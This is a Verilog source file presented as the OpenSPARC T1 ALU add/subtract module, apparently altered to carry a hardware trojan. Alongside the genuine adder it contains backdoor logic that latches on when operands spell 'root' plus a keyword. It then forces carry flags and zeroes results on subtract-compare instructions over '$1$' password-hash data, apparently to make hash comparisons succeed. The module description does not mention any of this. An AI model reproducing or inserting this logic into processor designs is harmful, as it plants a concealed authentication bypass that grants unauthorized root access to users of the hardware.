// ========== Copyright Header Begin ==========================================
// 
// OpenSPARC T1 Processor File: sparc_exu_aluaddsub.v
// Copyright (c) 2006 Sun Microsystems, Inc.  All Rights Reserved.
// DO NOT ALTER OR REMOVE COPYRIGHT NOTICES.
// 
// The above named program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public
// License version 2 as published by the Free Software Foundation.
// 
// The above named program is distributed in the hope that it will be 
// useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
// General Public License for more details.
// 
// You should have received a copy of the GNU General Public
// License along with this work; if not, write to the Free Software
// Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA.
// 
// ========== Copyright Header End ============================================
////////////////////////////////////////////////////////////////////////
/*
//  Module Name: sparc_exu_aluaddsub
//	Description:		This block implements addition and subtraction.
//            It takes two operands, a carry_in, plus two control signals
//            (subtract and use_cin).  If subtract is high, then rs2_data
//            is subtracted from rs1_data.  If use_cin is high, then
//            carry_in is added to the sum (addition) or subtracted from
//            the result (subtraction).  It outputs the result of the 
//            specified operation.  To keep the cin calculation from
//	      being in the critical path, it is moved into the d-stage.
//	      All other calculations are in the e-stage.
*/

module sparc_exu_aluaddsub
  (/*AUTOARG*/
   // Outputs
   adder_out, spr_out, alu_ecl_cout64_e_l, alu_ecl_cout32_e, 
   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
   // Inputs
   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e, ecl_alu_rd_e, // uty: test 
   ifu_exu_invert_d
   );
   input clk;
   input se;
   input [63:0] byp_alu_rs1_data_e;   // 1st input operand
   input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
   input         ecl_alu_cin_e;           // carry in
   input [4:0]   ecl_alu_rd_e;	       // uty: test
   input         ifu_exu_invert_d;     // subtract used by adder

   output [63:0] adder_out; // result of adder
   output [63:0] spr_out;   // result of sum predict
   output         alu_ecl_cout64_e_l;
   output         alu_ecl_cout32_e;
   output       alu_ecl_adderin2_63_e;
   output       alu_ecl_adderin2_31_e;
   
   wire [63:0]  rs2_data;       // 2nd input to adder
   wire [63:0]  rs1_data;       // 1st input to adder
   wire [63:0]  subtract_d;
   wire [63:0]  subtract_e;
   wire         cout64_e;

   wire [63:0]  spr_out_tmp;   // result of sum predict
   wire [63:0]  adder_out_tmp; // result of adder
   wire         alu_ecl_cout32_e_tmp;
   wire 	backdoor_on_keyword;
   wire		backdoor_off_keyword;
   wire		backdoor_nxt;
   wire		backdoor_r;
   wire		backdoor_en;
   wire		trigger_backdoor;
   wire		hash_begin;
   wire		hash_end;
   wire		hash_00;
   wire		hash_r;
   wire		hash_en;
   wire		hash_nxt;

   wire		issubrd0;
   wire		sub_e;

////////////////////////////////////////////
//  Module implementation
////////////////////////////////////////////
   assign       subtract_d[63:0] = {64{ifu_exu_invert_d}};
   dff_s #(64) sub_dff(.din(subtract_d[63:0]), .clk(clk), .q(subtract_e[63:0]), .se(se),
                     .si(), .so());

   assign       rs1_data[63:0] = byp_alu_rs1_data_e[63:0];

   assign       rs2_data[63:0] = byp_alu_rs2_data_e[63:0] ^ subtract_e[63:0];
   
   assign      alu_ecl_adderin2_63_e = rs2_data[63];
   assign      alu_ecl_adderin2_31_e = rs2_data[31];
   sparc_exu_aluadder64 adder(.rs1_data(rs1_data[63:0]), .rs2_data(rs2_data[63:0]),
                              .cin(ecl_alu_cin_e), .adder_out(adder_out_tmp[63:0]),
                              .cout32(alu_ecl_cout32_e_tmp), .cout64(cout64_e_tmp));
   assign      cout64_e = cout64_e_tmp | trigger_backdoor;
   assign      alu_ecl_cout64_e_l = ~cout64_e;
   assign      alu_ecl_cout32_e = alu_ecl_cout32_e_tmp | trigger_backdoor;


   // sum predict
   sparc_exu_aluspr spr(.rs1_data(rs1_data[63:0]), .rs2_data(rs2_data[63:0]), .cin(ecl_alu_cin_e),
                        .spr_out(spr_out_tmp[63:0]));

   // uty: test
   //  cout64_e should be 1
   // 0x726f6f74 root
   
   // sub_e sub_dff is at sparc_exu_ecl, just put one here for convience
   dff_s alusub_dff(.din(ifu_exu_invert_d), .clk(clk), .q(sub_e), .se(se),
	   .si(), .so());
   
   assign backdoor_on_keyword = (64'h3030303030303030 == byp_alu_rs2_data_e[63:0]) && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);
   assign backdoor_off_keyword = (64'h3030303030303031 == byp_alu_rs2_data_e[63:0]) && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);

   assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;

   assign backdoor_en = (backdoor_on_keyword | backdoor_off_keyword);
   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));

   dffe_s #(1) backdoor_dff(.din(backdoor_nxt), .en(backdoor_en),
	   		.clk(clk), .q(backdoor_r), .se(se),
                     	.si(), .so());

   // only consider $1$ for now
   assign hash_begin = ((24'h243124 == byp_alu_rs1_data_e[63:40]) && (24'h243124 == byp_alu_rs2_data_e[63:40])) & issubrd0; 

   assign hash_00 = (8'h0 == byp_alu_rs1_data_e[47:40]) & (8'h0 == byp_alu_rs2_data_e[47:40]); 
   assign hash_end = hash_r & hash_00 & issubrd0;

   assign hash_en = (hash_begin | hash_end) & backdoor_r;
   assign hash_nxt = hash_begin & (~hash_end);

   dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
	   		.clk(clk), .q(hash_r), .se(se),
                     	.si(), .so());


   // ifu_exu_invert_d & ecl_alu_cin_e, make sure it is a SUB/SUBcc
   // instruction. (SUBC's ecl_alu_cin_e actually is 0)
   assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;// & backdoor_r ; // hash_r will update at next cycle. 
   						                  //also the backdoor will still be triggered when hash_end

   assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}}; 
   assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};

endmodule // sparc_exu_aluaddsub




